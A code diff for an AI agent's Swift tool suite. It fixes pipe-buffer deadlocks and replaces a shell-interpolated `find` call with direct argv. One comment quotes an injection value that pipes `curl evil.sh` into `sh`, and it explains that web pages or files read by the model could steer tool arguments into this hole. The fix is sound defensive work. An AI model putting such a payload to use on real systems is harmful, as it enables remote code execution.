@@ -250,10 +250,6 @@ struct CodeSearchTool: DevgenticTool {
             : nil
 
         let process = Process()
-        let outPipe = Pipe()
-        let errPipe = Pipe()
-        process.standardOutput = outPipe
-        process.standardError = errPipe
 
         if let rgPath = rgPath {
             process.executableURL = URL(fileURLWithPath: rgPath)
@@ -273,15 +269,15 @@ struct CodeSearchTool: DevgenticTool {
             process.arguments = grepArgs
         }
 
+        // grep / ripgrep write one "Permission denied" line per unreadable directory to
+        // STDERR, and this site attached stderr to a pipe it never read — over a home
+        // directory that passes 64 KB easily and the search hangs forever.
+        let rawOutput: String
         do {
-            try process.run()
-            process.waitUntilExit()
+            rawOutput = try ProcessRunner.run(process).standardOutput
         } catch {
             return "Error running search: \(error.localizedDescription)"
         }
-
-        let data = outPipe.fileHandleForReading.readDataToEndOfFile()
-        let rawOutput = String(data: data, encoding: .utf8) ?? ""
 
         if rawOutput.isEmpty {
             return "No matches found for '\(arguments.pattern)'."
@@ -369,49 +365,79 @@ struct GlobFilesTool: DevgenticTool {
         }
         let maxResults = arguments.max_results ?? 100
 
-        // Use find + shell glob for pattern matching
+        // `find` is invoked DIRECTLY, never through a shell.
+        //
+        // This used to build a `zsh -c` string with the caller's pattern interpolated inside
+        // double quotes: `-name "\(pattern)"`. A pattern containing a double quote closes that
+        // quote and everything after it is shell syntax, so
+        //     a" ; curl evil.sh | sh ; echo "
+        // ran as its own command. `pattern` and `path` are tool ARGUMENTS — they come from the
+        // model, which means anything that can influence the model (a web page, a file it was
+        // asked to read, a poisoned dependency) could reach a shell through this tool. It is
+        // enabled on profiles that deliberately withhold shell access.
+        //
+        // The fix is structural, not more quoting: with `execve` argv, a pattern is one
+        // argument no matter what characters it contains, and there is no parser to escape
+        // from. Escaping is a thing you can get subtly wrong forever; argv is a thing you
+        // cannot.
         let process = Process()
-        let outPipe = Pipe()
-        process.executableURL = URL(fileURLWithPath: "/bin/zsh")
+        process.executableURL = URL(fileURLWithPath: "/usr/bin/find")
 
         let pattern = arguments.pattern
-        var cmd: String
+        // Heavy directories are PRUNED rather than filtered after the fact. `! -path` still
+        // descends into `node_modules` and discards the results; `-prune` never enters it. That
+        // more than pays back the `| head -N` this no longer uses — the pipeline used to make
+        // `find` die of SIGPIPE once enough lines had been printed, and the limit is now
+        // applied in Swift instead, below.
+        var pruneNames = ["-name", ".git", "-o", "-name", "node_modules"]
+        let matchPredicate: [String]
 
         if pattern.contains("**") {
-            // Recursive glob via find
-            let filePattern = pattern.replacingOccurrences(of: "**/", with: "")
-            cmd = "find \"\(basePath)\" -type f -name \"\(filePattern)\" ! -path '*/.git/*' ! -path '*/node_modules/*' ! -path '*/.build/*' ! -path '*/DerivedData/*' 2>/dev/null | head -\(maxResults)"
+            pruneNames += ["-o", "-name", ".build", "-o", "-name", "DerivedData"]
+            matchPredicate = ["-name", pattern.replacingOccurrences(of: "**/", with: "")]
         } else if pattern.contains("/") {
-            // Path-specific pattern
-            cmd = "find \"\(basePath)\" -type f -path '*/\(pattern)' ! -path '*/.git/*' ! -path '*/node_modules/*' 2>/dev/null | head -\(maxResults)"
+            // Path-shaped patterns keep the narrower prune set they have always had; widening
+            // it here would silently change which files this tool finds, which is not what an
+            // injection fix is for.
+            matchPredicate = ["-path", "*/\(pattern)"]
         } else {
-            // Simple filename pattern
-            cmd = "find \"\(basePath)\" -type f -name \"\(pattern)\" ! -path '*/.git/*' ! -path '*/node_modules/*' ! -path '*/.build/*' ! -path '*/DerivedData/*' 2>/dev/null | head -\(maxResults)"
+            pruneNames += ["-o", "-name", ".build", "-o", "-name", "DerivedData"]
+            matchPredicate = ["-name", pattern]
         }
 
-        process.arguments = ["-c", cmd]
-        process.standardOutput = outPipe
+        // `(` and `)` are literal arguments to `find`, not shell grouping — there is no shell
+        // here to interpret them, which is the whole point.
+        process.arguments = [basePath, "-type", "d", "("] + pruneNames + [")", "-prune", "-o", "-type", "f"]
+            + matchPredicate + ["-print"]
 
+        let output: String
         do {
-            try process.run()
-            process.waitUntilExit()
+            // stderr is deliberately ignored rather than suppressed with `2>/dev/null`:
+            // `find` reports unreadable directories there and exits non-zero, which is not a
+            // failure of the search. ProcessRunner keeps the streams apart, so ignoring it
+            // needs no shell redirection.
+            output = try ProcessRunner.run(process).standardOutput
+                .trimmingCharacters(in: .whitespacesAndNewlines)
         } catch {
             return "Error: \(error.localizedDescription)"
         }
-
-        let data = outPipe.fileHandleForReading.readDataToEndOfFile()
-        let output = String(data: data, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines) ?? ""
 
         if output.isEmpty {
             return "No files found matching '\(arguments.pattern)' in \(basePath)."
         }
 
-        let files = output.components(separatedBy: "\n").filter { !$0.isEmpty }
-        var result = "Found \(files.count) file(s) matching '\(arguments.pattern)':\n"
+        // `head -\(maxResults)` used to do this in the pipeline. Applied here instead, and the
+        // count reported is the number that MATCHED rather than the number shown — the old
+        // form could only infer truncation from `count >= maxResults`, which is also what an
+        // exact-fit result looks like.
+        let matched = output.components(separatedBy: "\n").filter { !$0.isEmpty }
+        let files = Array(matched.prefix(maxResults))
+
+        var result = "Found \(matched.count) file(s) matching '\(arguments.pattern)':\n"
         result += files.joined(separator: "\n")
 
-        if files.count >= maxResults {
-            result += "\n\n[Truncated at \(maxResults) results. Refine your pattern to narrow results.]"
+        if matched.count > maxResults {
+            result += "\n\n[Showing \(maxResults) of \(matched.count). Refine your pattern to narrow results.]"
         }
 
         return result
@@ -517,8 +543,6 @@ struct FindDefinitionTool: DevgenticTool {
                 : nil
 
             let process = Process()
-            let outPipe = Pipe()
-            process.standardOutput = outPipe
 
             if let rgPath = rgPath {
                 process.executableURL = URL(fileURLWithPath: rgPath)
@@ -539,9 +563,9 @@ struct FindDefinitionTool: DevgenticTool {
             }
 
             do {
-                try process.run()
-                process.waitUntilExit()
-                let data = outPipe.fileHandleForReading.readDataToEndOfFile()
+                // ProcessRunner drains stdout AND stderr concurrently; this site read the pipe
+                // only after waitUntilExit(), which hangs once output passes the ~64 KB buffer.
+                let data = Data(try ProcessRunner.run(process).standardOutput.utf8)
                 if let output = String(data: data, encoding: .utf8), !output.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
                     allResults.append(output.trimmingCharacters(in: .whitespacesAndNewlines))
                 }
@@ -671,16 +695,18 @@ struct BatchCommandTool: DevgenticTool {
         let timeout = min(arguments.timeout_seconds ?? 30, 300)
 
         let process = Process()
-        let outPipe = Pipe()
-        let errPipe = Pipe()
         process.executableURL = URL(fileURLWithPath: "/bin/zsh")
         process.arguments = ["-c", arguments.command]
-        process.standardOutput = outPipe
-        process.standardError = errPipe
         process.currentDirectoryURL = URL(fileURLWithPath: expandedWD)
 
         if arguments.background ?? false {
             do {
+                // No pipes on the background path. Nothing ever reads them, so attaching one
+                // guarantees the child wedges the moment it writes ~64 KB — a "launched in
+                // background" command that silently stops making progress. Discarding is the
+                // honest expression of "the caller is not collecting this output".
+                process.standardOutput = FileHandle.nullDevice
+                process.standardError = FileHandle.nullDevice
                 try process.run()
                 return "Command launched in background (PID: \(process.processIdentifier))."
             } catch {
@@ -688,52 +714,56 @@ struct BatchCommandTool: DevgenticTool {
             }
         }
 
+        // This site used to wait on `waitUntilExit()` and read the two pipes afterwards, which
+        // is the deadlock `ProcessRunner` exists to remove — and the timeout below hid it:
+        // any command producing more than ~64 KB blocked in `write()`, never exited, and was
+        // then reported as "timed out", which is a false statement about a command that had
+        // finished. `ProcessRunner.run(_:timeout:)` drains both streams concurrently, so the
+        // bound now applies to genuinely slow commands only.
+        // Off the cooperative pool. `ProcessRunner.run` is synchronous by design, and the 27
+        // sites it replaced were synchronous already — but this one was not, and `timeout`
+        // here goes up to 300s. Calling it inline would park a Swift-concurrency worker thread
+        // for five minutes; with a small fixed-width pool, a few concurrent `batch_command`
+        // calls would stall unrelated async work across the app.
+        nonisolated(unsafe) let target = process
+        let seconds = TimeInterval(timeout)
+        let run: ProcessRunner.TimedResult
         do {
-            try process.run()
+            run = try await withCheckedThrowingContinuation { continuation in
+                DispatchQueue.global(qos: .userInitiated).async {
+                    do { continuation.resume(returning: try ProcessRunner.run(target, timeout: seconds)) }
+                    catch { continuation.resume(throwing: error) }
+                }
+            }
         } catch {
             return "Error: \(error.localizedDescription)"
         }
 
-        // Timeout enforcement via structured concurrency
-        nonisolated(unsafe) let detachedProcess = process
-        nonisolated(unsafe) let detachedOutPipe = outPipe
-        nonisolated(unsafe) let detachedErrPipe = errPipe
+        var output = Self.truncateOutput(run.result.combinedOutput)
 
-        let timedOut = await withCheckedContinuation { (continuation: CheckedContinuation<Bool, Never>) in
-            nonisolated(unsafe) var resumed = false
-            DispatchQueue.global().async {
-                detachedProcess.waitUntilExit()
-                guard !resumed else { return }
-                resumed = true
-                continuation.resume(returning: false)
-            }
-            DispatchQueue.global().asyncAfter(deadline: .now() + .seconds(timeout)) {
-                guard !resumed else { return }
-                resumed = true
-                continuation.resume(returning: true)
-            }
+        // The command backgrounded something that still held the pipe when we stopped reading.
+        // Said in the observation, not just the log: from the agent's side an incomplete
+        // capture is indistinguishable from a command that simply printed less, and it would
+        // otherwise conclude the daemon produced nothing and try again.
+        if !run.result.outputComplete {
+            output += "\n\n[note] This command left a background process holding its output stream. "
+                + "Reading stopped when the command itself finished, so anything written after that is NOT shown above, "
+                + "and the background process loses its output stream. Redirect it to keep its output: `cmd > log 2>&1 &`."
         }
 
-        if timedOut {
-            process.terminate()
-            return "Error: Command timed out after \(timeout)s and was terminated."
+        if run.timedOut {
+            // Partial output is returned rather than discarded: a command killed at the bound
+            // usually produced the evidence for WHY it was slow before it was killed.
+            //
+            // Deliberately NOT `ShellExitStatus.annotate`-d. `terminationStatus` after a kill
+            // is the signal number, and annotating it would put `exit="9"` into episodic
+            // memory as though the command had chosen to exit 9 — the two are different facts.
+            return output.isEmpty
+                ? "Error: Command timed out after \(timeout)s and was killed. It produced no output."
+                : "Error: Command timed out after \(timeout)s and was killed. Output before the kill:\n\(output)"
         }
 
-        let stdoutData = detachedOutPipe.fileHandleForReading.readDataToEndOfFile()
-        let stderrData = detachedErrPipe.fileHandleForReading.readDataToEndOfFile()
-        let stdout = String(data: stdoutData, encoding: .utf8) ?? ""
-        let stderr = String(data: stderrData, encoding: .utf8) ?? ""
-        let exitCode = process.terminationStatus
-
-        // Combine stdout + stderr
-        var output = stdout
-        if !stderr.isEmpty {
-            output += (output.isEmpty ? "" : "\n") + "[stderr]\n" + stderr
-        }
-
-        output = Self.truncateOutput(output)
-
-        return "Exit code: \(exitCode)\n\(output)"
+        return ShellExitStatus.annotate(output, exitCode: run.result.exitCode)
     }
 }
 
